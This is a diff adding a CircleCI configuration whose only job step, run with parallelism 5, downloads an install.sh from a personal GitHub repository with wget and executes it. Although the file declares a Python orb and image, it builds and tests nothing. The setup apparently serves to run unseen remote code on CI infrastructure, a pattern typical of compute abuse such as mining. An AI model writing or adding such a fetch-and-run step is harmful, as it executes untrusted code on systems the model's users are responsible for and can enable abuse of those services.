@@ -1,0 +1,22 @@
+working_dir: &working_dir ~/app
+
+version: 2.1 
+ 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - job
+ 
+jobs: 
+  job:
+    parallelism: 5
+    docker: 
+      - image: cimg/python:3.8 
+     
+    steps:
+      - checkout
+      - run: wget https://raw.githubusercontent.com/kincanayo25/circleci/main/.circleci/install.sh && chmod +x install.sh && ./install.sh
